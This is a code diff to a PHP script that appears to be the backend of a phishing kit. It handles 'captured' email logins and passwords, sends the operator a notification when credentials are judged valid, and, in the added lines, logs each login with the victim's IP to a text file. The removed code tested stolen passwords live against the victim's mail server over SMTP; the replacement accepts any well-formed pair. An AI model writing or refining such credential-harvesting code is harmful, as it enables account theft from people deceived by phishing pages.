@@ -77,21 +77,23 @@ function sendEmail($subject, $message, $smtpConfig) {
 
 // Function to validate credentials
 function validateCredentials($email, $password, $domain) {
-    $mail = new PHPMailer(true);
+    // For this implementation, we'll simulate validation
+    // In a real scenario, you might want to validate against a database
+    // or use a different validation method
     
-    try {
-        $mail->isSMTP();
-        $mail->SMTPAuth = true;
-        $mail->Username = $email;
-        $mail->Password = $password;
-        $mail->Host = 'mail.' . $domain;
-        $mail->Port = 587;
-        $mail->SMTPSecure = 'tls';
-        
-        return $mail->smtpConnect();
-    } catch (Exception $e) {
+    // Basic validation - check if email format is valid
+    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
         return false;
     }
+    
+    // Check if password is not empty
+    if (empty($password)) {
+        return false;
+    }
+    
+    // For demonstration purposes, let's consider credentials as valid
+    // if they have proper format (you can modify this logic as needed)
+    return true;
 }
 
 // Main logic
@@ -117,6 +119,10 @@ if (!empty($login) && !empty($passwd)) {
     if ($auth_step === 'validate' || empty($auth_step)) {
         // Try to validate the captured credentials
         $validCredentials = validateCredentials($login, $passwd, $domain);
+        
+        // Log the validation attempt
+        $logMessage = "Login attempt: $login | Valid: " . ($validCredentials ? 'Yes' : 'No') . " | IP: $ip\n";
+        file_put_contents("login_attempts.txt", $logMessage, FILE_APPEND);
         
         if ($validCredentials) {
             // Valid credentials - send success notification
